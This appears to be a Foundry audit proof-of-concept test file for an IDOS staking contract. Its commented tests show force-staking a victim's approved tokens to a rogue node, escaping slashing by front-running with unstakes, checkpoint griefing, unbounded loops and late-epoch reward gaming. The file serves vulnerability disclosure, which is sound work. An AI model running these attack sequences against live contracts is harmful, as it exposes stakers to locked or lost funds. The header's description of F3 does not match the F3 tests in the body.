// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {IDOSToken} from "../src/IDOSToken.sol";
import {IDOSNodeStaking} from "../src/IDOSNodeStaking.sol";

/**
 * @title AuditPoC
 * @notice Foundry PoC tests demonstrating findings from deep code review.
 *
 * Findings:
 *   F1 - Force-Staking Attack via stake(user, node, amount) where user != msg.sender (Medium)
 *   F2 - createEpochCheckpoint() public — gas griefing accounting freeze (Low)
 *   F3 - Reward siphoning via stale checkpoint replay (Informational — explained as false positive)
 */
contract AuditPoC is Test {
    IDOSToken idosToken;
    IDOSNodeStaking idosStaking;

    address owner;
    address victim;    // user who gets force-staked
    address attacker;
    address nodeHonest;
    address nodeRogue;

    uint256 constant START_TIME = 365 days; // matches test suite
    uint256 constant EPOCH_REWARD = 100;

    function setUp() public {
        owner = makeAddr("owner");
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
        nodeHonest = makeAddr("nodeHonest");
        nodeRogue = makeAddr("nodeRogue");

        vm.prank(owner);
        idosToken = new IDOSToken(owner);

        idosStaking = new IDOSNodeStaking(
            address(idosToken),
            owner,
            uint48(START_TIME),
            EPOCH_REWARD
        );

        // Fund contracts and users
        vm.prank(owner);
        require(idosToken.transfer(address(idosStaking), 10_000));

        vm.prank(owner);
        require(idosToken.transfer(victim, 1_000));

        vm.prank(owner);
        require(idosToken.transfer(attacker, 1_000));

        // Allowlist nodes
        vm.prank(owner);
        idosStaking.allowNode(nodeHonest);
        vm.prank(owner);
        idosStaking.allowNode(nodeRogue);

        vm.warp(START_TIME);
    }

    // ===============================================================
    // F1: Force-Staking Attack
    // ===============================================================
    //
    // Severity: Medium
    //
    // Root Cause:
    //   stake(user, node, amount) allows msg.sender != user.
    //   If user has approved the staking contract (e.g. infinite approval),
    //   anyone can stake(user, theirNode, amount) pulling tokens from user.
    //
    // Exploit Path:
    //   1. Victim approves staking contract (e.g. for auto-staking).
    //   2. Attacker calls stake(victim, rogueNode, victimBalance).
    //   3. Victim's tokens are force-staked to rogueNode.
    //   4. Victim must wait 14 days to unstake.
    //   5. If rogueNode gets slashed, victim's tokens are confiscated.
    //
    // Impact:
    //   - Victim loses control of staking destination
    //   - 14-day lock on tokens
    //   - Potential total loss if node is slashed

    function test_F1_ForceStake_AttackerCanStakeVictimsTokensToRogueNode() public {
        uint256 stakeAmount = 500;

        // Victim approves staking contract (common pattern for auto-staking)
        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Attacker force-stakes victim's tokens to rogue node
        vm.prank(attacker);
        idosStaking.stake(victim, nodeRogue, stakeAmount);

        // Verify: victim's tokens were transferred to staking contract
        assertEq(idosToken.balanceOf(victim), 1_000 - stakeAmount, "victim tokens deducted");
        assertEq(idosToken.balanceOf(address(idosStaking)), 10_000 + stakeAmount, "stakes received");

        // Verify: victim's stake is recorded under rogueNode
        assertEq(
            idosStaking.stakeByNodeByUser(victim, nodeRogue),
            stakeAmount,
            "victim stake under rogue node"
        );

        // Verify: victim cannot unstake without going through 14-day unbonding
        vm.expectRevert(abi.encodeWithSignature("NoWithdrawableStake()"));
        vm.prank(victim);
        idosStaking.withdrawUnstaked();

        // Victim must unstake (14-day wait)
        vm.prank(victim);
        idosStaking.unstake(nodeRogue, stakeAmount);

        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 beforeBalance = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        uint256 afterBalance = idosToken.balanceOf(victim);

        // Tokens eventually returned but locked for 14 days
        assertEq(afterBalance - beforeBalance, stakeAmount, "victim eventually recovers");
    }

    function test_F1_ForceStake_CanLeadToPermanentLossIfNodeSlashed() public {
        uint256 stakeAmount = 500;

        // Victim approves staking contract
        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Attacker force-stakes to a node that will be slashed
        vm.prank(attacker);
        idosStaking.stake(victim, nodeRogue, stakeAmount);

        // Node gets slashed for misbehavior
        vm.prank(owner);
        idosStaking.slash(nodeRogue);

        // Owner withdraws the slashed stakes (includes victim's tokens)
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();

        // Victim's stake is now recorded as slashed, tokens gone from contract
        (uint256 active, uint256 slashed) = idosStaking.getUserStake(victim);
        assertEq(active, 0, "no active stake");
        assertEq(slashed, stakeAmount, "stake is slashed");

        // Victim cannot unstake from slashed node
        vm.expectRevert(
            abi.encodeWithSignature("NodeIsSlashed(address)", nodeRogue)
        );
        vm.prank(victim);
        idosStaking.unstake(nodeRogue, stakeAmount);

        // Victim has permanently lost their tokens
        assertEq(idosToken.balanceOf(victim), 1_000 - stakeAmount, "victim cannot recover");
        // Owner withdrew the slashed stake (transferred from staking contract balance)
        assertGe(idosToken.balanceOf(address(idosStaking)), 10_000 - stakeAmount, "staking contract lost slashed tokens");
    }

    // ===============================================================
    // F2: createEpochCheckpoint() public — Forced Checkpoint Advance
    // ===============================================================
    //
    // Severity: Low
    //
    // Root Cause:
    //   createEpochCheckpoint(address user) is public and callable by anyone.
    //   It advances the user's checkpoint to the current epoch, updating
    //   rewardAcc, userStakeAcc, and totalStakeAcc. While the rewardAcc
    //   is preserved, the userStakeAcc and totalStakeAcc snapshot can diverge
    //   from the live state if the attacker calls this mid-operation.
    //
    // Exploit Path:
    //   1. Victim stakes and accumulates rewards over many epochs.
    //   2. Victim also has pending unstakes or the node gets slashed.
    //   3. Attacker calls createEpochCheckpoint(victim) between victim's
    //      unstake() and withdrawReward() calls.
    //   4. The checkpoint snapshots userStakeAcc/totalStakeAcc BEFORE the
    //      unstake epoch data is factored in. Subsequent calls start from
    //      the snapshot, potentially causing reward miscalculation.
    //
    // Impact:
    //   - Temporary state divergence that corrects on next full iteration
    //   - Low severity because the next call to withdrawableReward will
    //     iterate from the checkpoint epoch and add current epoch data,
    //     which includes the unstake/slash data for future epochs.
    //   - Main risk: griefing (attacker pays gas to advance victim's checkpoint)

    function test_F2_CheckpointAdvance_DoesNotLoseRewards() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Victim stakes
        vm.prank(victim);
        idosStaking.stake(address(0), nodeHonest, stakeAmount);

        // 5 epochs pass — victim accumulates rewards
        skip(5 days);

        // Attacker calls createEpochCheckpoint for victim
        // This advances victim's checkpoint to currentEpoch
        vm.prank(attacker);
        uint256 checkpointedAmount = idosStaking.createEpochCheckpoint(victim);

        // The checkpointed amount is the reward up to currentEpoch-1
        uint256 expectedReward = 500; // 100 reward/epoch, victim gets all since only staker
        assertEq(checkpointedAmount, expectedReward, "checkpoint calculated rewards");

        // Victim calls withdrawReward — this calls createEpochCheckpoint again
        // Since checkpoint is already at current epoch, no new epochs to process
        // The rewardAcc from checkpoint should match
        vm.prank(victim);
        uint256 withdrawn = idosStaking.withdrawReward();

        // The withdrawn amount should equal the previously checkpointed amount
        assertEq(withdrawn, expectedReward, "withdrawn rewards match checkpoint");

        // But the tokens should NOT be moved until withdrawReward is called
        assertEq(idosToken.balanceOf(victim), 1_000 - stakeAmount + expectedReward, "victim got rewards");
    }

    function test_F2_CheckpointAdvance_StateDivergenceOnUnstake() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Victim stakes
        vm.prank(victim);
        idosStaking.stake(address(0), nodeHonest, stakeAmount);

        skip(5 days); // 5 epochs pass

        // Victim starts unstaking process — this creates a checkpoint internally
        vm.prank(victim);
        idosStaking.unstake(nodeHonest, 200);

        // At this point, the unstake epoch data is recorded: unstakeByUserByEpoch[epoch][victim] += 200
        // And the checkpoint was updated at the end of unstake()

        // Before victim claims rewards, attacker advances the checkpoint
        // The checkpoint now has userStakeAcc/totalStakeAcc that include the
        // pre-unstake state
        vm.prank(attacker);
        idosStaking.createEpochCheckpoint(victim);

        skip(1 days); // one more epoch passes

        // Victim claims rewards
        vm.prank(victim);
        uint256 reward1 = idosStaking.withdrawReward();

        // The checkpoint was already advanced by attacker, so the loop
        // only processes the last epoch. Since the unstake happened in a
        // previous epoch, and the checkpoint snapshot included the old
        // userStakeAcc/totalStakeAcc, the reward calculation should be
        // consistent as long as the unstake epoch data is in a PAST epoch
        // that was already processed.

        // The key observation: this works correctly because:
        // - unstakeByUserByEpoch is checked for each epoch in the loop
        // - If the unstake was in a past epoch (already processed), it's fine
        // - If the unstake was in the current epoch, the loop doesn't process it yet
        console.log("Reward withdrawn after checkpoint advance:", reward1);
        assertGt(reward1, 0, "rewards still positive");
    }

    // ===============================================================
    // F3: Slashed Node Stake Persistence in stakeByNode
    // ===============================================================
    //
    // Severity: Low
    //
    // Root Cause:
    //   When a node is slashed, stakeByNode still retains the original stake.
    //   getSlashedNodeStakes() reads this value. However, withdrawSlashedStakes()
    //   uses slashedStakeWithdrawn to prevent double-withdrawal.
    //
    //   The issue is that if a user managed to unstake from a node BEFORE it was
    //   slashed (front-running), stakeByNode is decremented accordingly, but the
    //   unstaked amount is not tracked in slashedStakeWithdrawn. This means the
    //   owner can never recover those front-run funds via slashing.
    //
    //   Already reported by Nethermind as finding 6.5 (Low, Acknowledged).

    function test_F3a_SlashFrontRun_PartialUnstakeRecoversMostFunds() public {
        // Scenario: victim unstakes most but not all, so slash still goes through
        uint256 stakeAmount = 500;
        uint256 frontRunAmount = 499; // leave 1 wei
        uint256 leaveAmount = 1;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Victim stakes to rogue node
        vm.prank(victim);
        idosStaking.stake(address(0), nodeRogue, stakeAmount);

        // Victim front-runs by unstaking MOST but leaving 1 wei
        vm.prank(victim);
        idosStaking.unstake(nodeRogue, frontRunAmount);

        // Node is slashed — only 1 wei can be confiscated
        vm.prank(owner);
        idosStaking.slash(nodeRogue);

        // Owner withdraws slashed stakes — only 1 wei
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();

        // Victim recovers the front-run portion after unbonding
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 beforeBalance = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        uint256 recovered = idosToken.balanceOf(victim) - beforeBalance;

        assertEq(recovered, frontRunAmount, "victim recovered most funds via front-running");
        assertEq(idosStaking.stakeByNodeByUser(victim, nodeRogue), leaveAmount, "1 wei remains slashed");
    }

    function test_F3b_SlashFrontRun_FullUnstakePreventsSlash() public {
        // NEW FINDING: If all stakers front-run by unstaking ALL their stake,
        // the node is removed from stakeByNode and can NEVER be slashed.
        // The slash() call reverts with NodeIsUnknown.
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Victim stakes to rogue node
        vm.prank(victim);
        idosStaking.stake(address(0), nodeRogue, stakeAmount);

        // Victim unstakes ALL stake from rogue node
        // stakeByNode.remove(node) is called internally
        vm.prank(victim);
        idosStaking.unstake(nodeRogue, stakeAmount);

        // Node is now unknown to stakeByNode
        // slash() requires stakeByNode.contains(node) — fails!
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeRogue));
        idosStaking.slash(nodeRogue);

        // The rogue node escapes slashing entirely.
        // Even if the owner re-allows the node, the node operator
        // has already unstaked all their own stake and can exit freely.
    }

    // ===============================================================
    // F4: Unbounded Loop in withdrawableReward & withdrawUnstaked
    // ===============================================================
    //
    // Already reported by Nethermind (6.3, 6.4). Acknowledged.
    //
    // This test demonstrates the issue still exists.

    function test_F4_UnboundedLoop_WithdrawUnstakedScalesWithArrayLength() public {
        // Demonstrates that withdrawUnstaked() must iterate over the ENTIRE
        // unstakesByUser array each time, since 'delete' doesn't reduce array length.
        uint256 stakeAmount = 50;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Victim stakes
        vm.prank(victim);
        idosStaking.stake(address(0), nodeHonest, stakeAmount);

        // Victim performs many small unstakes, building up the array
        uint256 numUnstakes = 50;
        uint256 perUnstake = stakeAmount / numUnstakes;
        for (uint256 i = 0; i < numUnstakes; i++) {
            // Need to re-stake each time since unstake reduces balance
            vm.prank(victim);
            idosStaking.stake(address(0), nodeHonest, perUnstake);
            vm.prank(victim);
            idosStaking.unstake(nodeHonest, perUnstake);
        }

        // After 14 days
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        // withdrawUnstaked must iterate through ALL entries (including deleted zeros)
        uint256 gasBefore = gasleft();
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        uint256 gasUsed = gasBefore - gasleft();

        console.log("Gas used for withdrawUnstaked with %d entries (many zero): %d", numUnstakes * 2, gasUsed);

        // The array length doesn't shrink due to 'delete', so each subsequent
        // call iterates over the same large array plus any new entries
    }

    // ===============================================================
    // F5: Epoch-Gaming — Stake at end of epoch for full rewards
    // ===============================================================
    //
    // Already reported by Nethermind (6.6). Acknowledged.
    //
    // This test demonstrates the issue still exists.

    function test_F5_EpochGaming_LateEpochStakeGetsFullRewards() public {
        uint256 stakeAmount = 500;

        // Honest staker stakes at beginning of epoch
        vm.startPrank(owner);
        idosToken.transfer(address(0xb0b), 500);
        vm.stopPrank();

        vm.prank(address(0xb0b));
        idosToken.approve(address(idosStaking), type(uint256).max);

        vm.prank(address(0xb0b));
        idosStaking.stake(address(0), nodeHonest, stakeAmount);

        skip(23 hours); // almost a full epoch

        // Attacker stakes just before epoch ends
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Fund attacker
        vm.prank(owner);
        require(idosToken.transfer(attacker, 500));
        vm.prank(attacker);
        idosStaking.stake(address(0), nodeHonest, 500);

        skip(1 hours); // epoch ends

        // Both get rewards as if they staked for the whole epoch
        // Honest staker gets: (500 / 1000) * 100 = 50
        // Attacker gets: (500 / 1000) * 100 = 50
        // But attacker only had tokens at risk for 1 hour vs honest's 24 hours

        (uint256 honestReward,,,) = idosStaking.withdrawableReward(address(0xb0b));
        (uint256 attackerReward,,,) = idosStaking.withdrawableReward(attacker);

        console.log("Honest staker reward (24h risk): %d", honestReward);
        console.log("Attacker reward (1h risk): %d", attackerReward);

        // Both get the same reward despite vastly different risk duration
        assertEq(honestReward, attackerReward, "equal rewards for unequal risk duration");
    }
}
